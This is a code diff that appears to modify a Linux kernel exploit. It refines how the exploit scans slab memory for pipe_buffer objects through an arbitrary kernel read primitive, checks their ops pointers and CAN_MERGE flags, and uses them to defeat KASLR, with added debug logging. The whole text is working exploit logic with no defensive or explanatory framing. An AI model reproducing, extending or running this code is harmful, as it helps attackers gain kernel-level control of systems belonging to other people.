@@ -492,17 +492,30 @@ int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
     return 0;
   }
   for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
-    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
-        PIPE_SCAN_CHUNK) {
+    errno = 0;
+    ssize_t got = kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK);
+    if (got != PIPE_SCAN_CHUNK) {
+      pr_warning("pipe slab read failed base=%016zx chunk=%zu target=%016zx "
+                 "got=%zd errno=%d\n",
+                 base, off, base + off, got, errno);
       return 0;
     }
   }
   return 1;
 }
 
-static int pipe_buffer_is_valid(const struct user_pipe_buffer *pb) {
+static int pipe_buffer_shape_is_valid(const struct user_pipe_buffer *pb) {
+  uintptr_t ops_image = ANON_PIPE_BUF_OPS;
   return pb && pb->page >= VMEMMAP_START && pb->page < VMEMMAP_END &&
-         pb->offset == 0 && pb->ops == pipe_buf_ops_addr() &&
+         ((pb->page - VMEMMAP_START) % STRUCT_PAGE_SIZE) == 0 &&
+         pb->offset == 0 && pb->ops >= ops_image &&
+         pb->ops - ops_image <= 0x00400000ULL &&
+         pb->flags == PIPE_BUF_FLAG_CAN_MERGE && pb->private == 0;
+}
+
+static int pipe_buffer_is_valid(const struct user_pipe_buffer *pb) {
+  return pipe_buffer_shape_is_valid(pb) &&
+         pb->ops == pipe_buf_ops_addr() &&
          pb->flags == PIPE_BUF_FLAG_CAN_MERGE && pb->private == 0 &&
          pb->len > 0 && pb->len <= PIPE_RECLAIM;
 }
@@ -510,6 +523,7 @@ static int pipe_buffer_is_valid(const struct user_pipe_buffer *pb) {
 static int validate_pipe_buffer_page(int fd, uintptr_t base) {
   unsigned char slab[ORDER3_SIZE];
   size_t valid = 0;
+  uint64_t first_ops = 0;
 
   if (!read_pipe_slab(fd, base, slab)) {
     return 0;
@@ -518,14 +532,23 @@ static int validate_pipe_buffer_page(int fd, uintptr_t base) {
        off += PIPE_OBJECT_SIZE) {
     struct user_pipe_buffer pb;
     memcpy(&pb, slab + off, sizeof(pb));
-    if (pb.len == PAGE_SIZE && pb.page >= VMEMMAP_START &&
-        pb.page < VMEMMAP_END && pb.offset == 0 &&
-        pb.ops == pipe_buf_ops_addr() &&
-        pb.flags == PIPE_BUF_FLAG_CAN_MERGE && pb.private == 0) {
-      valid++;
+    if (pb.len != PAGE_SIZE || !pipe_buffer_shape_is_valid(&pb)) {
+      continue;
     }
+    if (first_ops == 0) {
+      first_ops = pb.ops;
+    }
+    if (pb.ops != first_ops ||
+        (kaslr_done && pb.ops != pipe_buf_ops_addr())) {
+      continue;
+    }
+    valid++;
   }
-  pr_info("pipe page candidate base=%016zx full_buffers=%zu\n", base, valid);
+  pr_info("pipe page candidate base=%016zx full_buffers=%zu ops=%016llx "
+          "expected=%016llx kaslr=%d\n",
+          base, valid, (unsigned long long)first_ops,
+          (unsigned long long)(kaslr_done ? pipe_buf_ops_addr() : 0),
+          kaslr_done);
   return valid >= 4;
 }
 
